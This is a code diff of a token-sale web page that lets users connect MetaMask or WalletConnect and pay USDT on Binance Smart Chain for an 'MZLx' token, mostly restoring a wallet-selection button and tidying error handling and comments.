@@ -19,6 +19,10 @@
     button { width: 100%; padding: 17px; background: linear-gradient(to right, #1a73e8, #0d5abf); color: #fff; border: none; border-radius: 10px; font-size: 1.1rem; font-weight: 600; cursor: pointer; margin-bottom: 15px; transition: all 0.3s; }
     button:hover:not(:disabled) { background: linear-gradient(to right, #0d5abf, #0a4a9e); }
     button:disabled { background: #aaa; cursor: not-allowed; }
+    .wallet-options { display: none; margin-top: 15px; }
+    .wallet-option { display: flex; align-items: center; justify-content: center; padding: 15px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 10px; cursor: pointer; background: #f8f9fa; transition: all 0.3s; }
+    .wallet-option:hover { background: #eef5ff; border-color: #1a73e8; }
+    .wallet-icon { width: 30px; height: 30px; margin-right: 12px; object-fit: contain; }
     .footer { text-align: center; color: #999; font-size: 0.85rem; margin-top: 25px; padding-top: 15px; border-top: 1px solid #eee; }
     .status { margin-top: 20px; padding: 15px; border-radius: 10px; display: none; font-size: 0.95rem; }
     .status.processing { background: #cce5ff; color: #004085; border: 1px solid #b8daff; }
@@ -27,11 +31,9 @@
     .spinner { display: inline-block; width: 24px; height: 24px; border: 3px solid rgba(26, 115, 232, 0.3); border-radius: 50%; border-top-color: #1a73e8; animation: spin 1s linear infinite; margin-right: 10px; vertical-align: middle; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     .connected-info { margin: 15px 0; padding: 10px; background: #e8f5e9; border-radius: 8px; color: #28a745; font-weight: 600; }
-    .wallet-option { display: flex; align-items: center; justify-content: center; padding: 15px; margin: 12px 0; border: 1px solid #ddd; border-radius: 10px; cursor: pointer; background: #f8f9fa; transition: all 0.3s; }
-    .wallet-option:hover { background: #eef5ff; border-color: #1a73e8; }
-    .wallet-icon { width: 30px; height: 30px; margin-right: 12px; object-fit: contain; }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@1.7.8/dist/umd/index.min.js"></script>
 </head>
 <body>
   <div class="container">
@@ -47,14 +49,18 @@
     
     <div class="output" id="mzlxOutput">You will receive: 0 MZLx</div>
     
-    <div id="walletOptions">
+    <!-- Restored Connect Wallet button -->
+    <button id="connectBtn">Connect Wallet</button>
+    
+    <!-- Wallet options container -->
+    <div class="wallet-options" id="walletOptions">
       <div class="wallet-option" id="metamaskOption">
         <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="wallet-icon" alt="MetaMask">
-        <span>Connect with MetaMask</span>
+        <span>MetaMask</span>
       </div>
       <div class="wallet-option" id="walletConnectOption">
         <img src="https://avatars.githubusercontent.com/u/37784886" class="wallet-icon" alt="WalletConnect">
-        <span>Connect with WalletConnect</span>
+        <span>WalletConnect</span>
       </div>
     </div>
     
@@ -69,7 +75,7 @@
   </div>
 
   <script>
-    // ===== GUARANTEED WALLET UI SOLUTION ===== //
+    // ===== GUARANTEED WORKFLOW SOLUTION ===== //
     const TOKEN_PRICE = 0.15;
     const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
     const RECEIVER_ADDRESS = "0x4bd6033bCe207fa4F5a2Bd4d003a690ed4c3D859";
@@ -86,7 +92,9 @@
     // UI Elements
     const usdtInput = document.getElementById("usdtAmount");
     const mzlxOutput = document.getElementById("mzlxOutput");
+    const connectBtn = document.getElementById("connectBtn");
     const buyBtn = document.getElementById("buyBtn");
+    const walletOptions = document.getElementById("walletOptions");
     const statusMessage = document.getElementById("statusMessage");
     const metamaskOption = document.getElementById("metamaskOption");
     const walletConnectOption = document.getElementById("walletConnectOption");
@@ -99,16 +107,23 @@
     let userAddress = null;
     let currentUSDTAmount = 0;
     let currentMZLxAmount = 0;
+    let walletConnectProvider = null;
 
     // Initialize
     document.addEventListener('DOMContentLoaded', initApp);
     
     function initApp() {
       usdtInput.addEventListener('input', handleUSDTInput);
+      connectBtn.addEventListener('click', toggleWalletOptions);
       metamaskOption.addEventListener('click', connectMetaMask);
       walletConnectOption.addEventListener('click', connectWalletConnect);
       buyBtn.addEventListener('click', startPurchaseProcess);
       updateMZLxOutput();
+    }
+
+    // Restore wallet options toggle
+    function toggleWalletOptions() {
+      walletOptions.style.display = walletOptions.style.display === 'flex' ? 'none' : 'flex';
     }
 
     // Real-time calculation
@@ -127,18 +142,23 @@
       buyBtn.disabled = !userAddress || currentUSDTAmount < TOKEN_PRICE;
     }
 
-    // Wallet Connection - GUARANTEED to show native interface
+    // MetaMask connection - Direct extension trigger
     async function connectMetaMask() {
+      walletOptions.style.display = 'none';
+      
       try {
-        showStatus("Opening MetaMask...", "processing");
+        showStatus("Connecting to MetaMask...", "processing");
         
-        if (!window.ethereum) {
-          window.open("https://metamask.io/download.html", "_blank");
-          showStatus("MetaMask not installed. Please install it first.", "error");
+        if (!window.ethereum || !window.ethereum.isMetaMask) {
+          // Offer to install MetaMask if not detected
+          if (confirm("MetaMask not detected! Would you like to install it?")) {
+            window.open("https://metamask.io/download.html", "_blank");
+          }
+          showStatus("Please install MetaMask first", "error");
           return;
         }
         
-        // This will IMMEDIATELY open MetaMask's native interface
+        // Trigger MetaMask extension directly
         const accounts = await window.ethereum.request({ 
           method: 'eth_requestAccounts' 
         });
@@ -151,6 +171,7 @@
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
         
+        // Update UI
         showStatus("Wallet connected successfully!", "success");
         connectedInfo.style.display = "block";
         walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
@@ -162,15 +183,15 @@
       }
     }
 
+    // WalletConnect connection
     async function connectWalletConnect() {
+      walletOptions.style.display = 'none';
+      
       try {
         showStatus("Preparing WalletConnect...", "processing");
         
-        // Dynamically load WalletConnect only when needed
-        const { default: WalletConnectProvider } = await import('https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@1.7.8/dist/umd/index.min.js');
-        
         // Initialize WalletConnect
-        const walletConnectProvider = new WalletConnectProvider({
+        walletConnectProvider = new WalletConnectProvider.default({
           rpc: { 
             56: "https://bsc-dataseed.binance.org/" 
           },
@@ -181,7 +202,7 @@
           }
         });
         
-        // This will IMMEDIATELY open WalletConnect QR modal
+        // Enable session - triggers QR modal
         await walletConnectProvider.enable();
         
         // Initialize provider and signer
@@ -189,6 +210,7 @@
         signer = provider.getSigner();
         userAddress = await signer.getAddress();
         
+        // Update UI
         showStatus("Wallet connected successfully!", "success");
         connectedInfo.style.display = "block";
         walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
@@ -208,21 +230,25 @@
         });
       } catch (switchError) {
         if (switchError.code === 4902) {
-          await window.ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: '0x38',
-              chainName: 'Binance Smart Chain',
-              nativeCurrency: { name: 'BNB', symbol: 'bnb', decimals: 18 },
-              rpcUrls: ['https://bsc-dataseed.binance.org/'],
-              blockExplorerUrls: ['https://bscscan.com']
-            }]
-          });
+          try {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: '0x38',
+                chainName: 'Binance Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'bnb', decimals: 18 },
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                blockExplorerUrls: ['https://bscscan.com']
+              }]
+            });
+          } catch (addError) {
+            console.error("Failed to add BSC network:", addError);
+          }
         }
       }
     }
 
-    // Purchase Process - GUARANTEED Wallet UI
+    // Purchase Process - Guaranteed Wallet UI
     async function startPurchaseProcess() {
       if (!userAddress || currentUSDTAmount < TOKEN_PRICE) {
         showStatus("Please connect wallet and enter valid USDT amount", "error");
@@ -231,6 +257,15 @@
       
       try {
         showStatus("Preparing transaction...", "processing");
+        
+        // Reinitialize signer if needed
+        if (!signer) {
+          if (provider instanceof ethers.BrowserProvider) {
+            signer = await provider.getSigner();
+          } else {
+            signer = provider.getSigner();
+          }
+        }
         
         // Get USDT contract with signer
         const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
@@ -249,11 +284,11 @@
         // Check allowance
         const allowance = await usdtContract.allowance(userAddress, RECEIVER_ADDRESS);
         if (allowance < usdtValue) {
-          // GUARANTEED APPROVAL UI
+          // Trigger wallet's native approval interface
           await triggerApproval(usdtContract, usdtValue);
         }
         
-        // GUARANTEED TRANSFER UI
+        // Trigger wallet's native transfer interface
         await triggerTransfer(usdtContract, usdtValue);
         
         // Notify backend
@@ -272,7 +307,7 @@
       }
     }
     
-    // Guaranteed to show wallet UI for approval
+    // Trigger wallet's native approval interface
     async function triggerApproval(contract, value) {
       showStatus("Approval needed. Please confirm in your wallet...", "processing");
       
@@ -282,7 +317,7 @@
       showStatus("USDT spending approved!", "success");
     }
     
-    // Guaranteed to show wallet UI for transfer
+    // Trigger wallet's native transfer interface
     async function triggerTransfer(contract, value) {
       showStatus("Sending USDT. Please confirm in your wallet...", "processing");
       
